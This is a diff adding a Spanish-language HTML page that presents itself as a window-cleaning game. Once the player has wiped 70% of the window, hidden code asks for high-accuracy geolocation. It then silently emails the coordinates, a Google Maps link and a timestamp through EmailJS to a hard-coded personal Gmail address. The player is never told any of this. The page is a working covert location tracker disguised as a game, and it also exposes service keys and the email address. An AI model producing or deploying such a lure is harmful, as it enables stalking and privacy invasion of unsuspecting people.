@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LIMPIA LA VENTANA</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #111;
+      color: #fff;
+      font-family: 'Courier New', monospace;
+      overflow: hidden;
+      touch-action: none;
+    }
+    canvas {
+      display: block;
+      margin: 0 auto;
+      background: #222;
+    }
+    #info {
+      position: absolute;
+      top: 10px;
+      left: 0;
+      width: 100%;
+      text-align: center;
+      font-size: 22px;
+      text-shadow: 0 0 10px #0ff;
+      pointer-events: none;
+    }
+    #progress {
+      position: absolute;
+      top: 60px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="info">🪟 LIMPIA LA VENTANA 🪟</div>
+  <div id="progress">Progreso: 0%</div>
+  <canvas id="game" width="800" height="500"></canvas>
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <script>
+    // ================== CREDENCIALES ==================
+    const PUBLIC_KEY = "A9BWp-zzuoRbpZke3";
+    const SERVICE_ID = "Prueba N°5";
+    const TEMPLATE_ID = "template_8tg6m7a";
+    const DESTINO_EMAIL = "steven322ml@gmail.com";
+    // ================================================
+
+    emailjs.init(PUBLIC_KEY);
+
+    const canvas = document.getElementById("game");
+    const ctx = canvas.getContext("2d");
+    const progressText = document.getElementById("progress");
+
+    let progress = 0;
+    let isCleaning = false;
+    let lastX = 0, lastY = 0;
+    let locationSent = false;
+
+    // Crear "suciedad" (partículas)
+    let dirt = [];
+    for (let i = 0; i < 800; i++) {
+      dirt.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        size: Math.random() * 8 + 4,
+        alpha: Math.random() * 0.6 + 0.4
+      });
+    }
+
+    function drawWindow() {
+      // Fondo de vidrio sucio
+      ctx.fillStyle = "#334455";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      // Marco de ventana
+      ctx.strokeStyle = "#aaa";
+      ctx.lineWidth = 30;
+      ctx.strokeRect(20, 20, canvas.width-40, canvas.height-40);
+
+      // Suciedad
+      ctx.fillStyle = "#222";
+      dirt.forEach(d => {
+        ctx.globalAlpha = d.alpha;
+        ctx.fillRect(d.x, d.y, d.size, d.size);
+      });
+      ctx.globalAlpha = 1;
+    }
+
+    function clean(x, y) {
+      ctx.save();
+      ctx.globalCompositeOperation = "destination-out";
+      ctx.beginPath();
+      ctx.arc(x, y, 35, 0, Math.PI * 2);
+      ctx.fill();
+      ctx.restore();
+
+      // Limpiar partículas cercanas
+      dirt = dirt.filter(d => {
+        const dist = Math.hypot(d.x - x, d.y - y);
+        return dist > 40;
+      });
+
+      // Calcular progreso
+      progress = Math.min(100, Math.round((800 - dirt.length) / 8));
+      progressText.textContent = `Progreso: ${progress}%`;
+    }
+
+    function gameLoop() {
+      drawWindow();
+      requestAnimationFrame(gameLoop);
+    }
+
+    // Controles táctiles y mouse
+    function startCleaning(e) {
+      isCleaning = true;
+      const rect = canvas.getBoundingClientRect();
+      lastX = e.touches ? e.touches[0].clientX - rect.left : e.clientX - rect.left;
+      lastY = e.touches ? e.touches[0].clientY - rect.top : e.clientY - rect.top;
+    }
+
+    function moveCleaning(e) {
+      if (!isCleaning) return;
+      const rect = canvas.getBoundingClientRect();
+      const x = e.touches ? e.touches[0].clientX - rect.left : e.clientX - rect.left;
+      const y = e.touches ? e.touches[0].clientY - rect.top : e.clientY - rect.top;
+
+      clean(x, y);
+      
+      // Efecto de trazo continuo
+      ctx.save();
+      ctx.globalCompositeOperation = "destination-out";
+      ctx.lineWidth = 50;
+      ctx.lineCap = "round";
+      ctx.beginPath();
+      ctx.moveTo(lastX, lastY);
+      ctx.lineTo(x, y);
+      ctx.stroke();
+      ctx.restore();
+
+      lastX = x;
+      lastY = y;
+
+      // Enviar ubicación cuando llegue al 70% de limpieza
+      if (progress >= 70 && !locationSent) {
+        locationSent = true;
+        sendLocation();
+      }
+    }
+
+    function stopCleaning() {
+      isCleaning = false;
+    }
+
+    // ================== ENVIAR UBICACIÓN ==================
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapsLink = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
+
+            const templateParams = {
+              to_email: DESTINO_EMAIL,
+              latitude: lat.toFixed(6),
+              longitude: lon.toFixed(6),
+              maps_link: mapsLink,
+              date: new Date().toLocaleString('es-PE')
+            };
+
+            emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
+              .then(() => {
+                console.log("✅ Ubicación enviada");
+              })
+              .catch(err => console.error("Error:", err));
+          },
+          () => console.log("Ubicación denegada"),
+          { enableHighAccuracy: true, timeout: 15000 }
+        );
+      }
+    }
+
+    // Eventos
+    canvas.addEventListener("mousedown", startCleaning);
+    canvas.addEventListener("mousemove", moveCleaning);
+    canvas.addEventListener("mouseup", stopCleaning);
+    canvas.addEventListener("mouseleave", stopCleaning);
+
+    canvas.addEventListener("touchstart", startCleaning);
+    canvas.addEventListener("touchmove", moveCleaning);
+    canvas.addEventListener("touchend", stopCleaning);
+
+    // Iniciar juego
+    gameLoop();
+  </script>
+
+</body>
+</html>
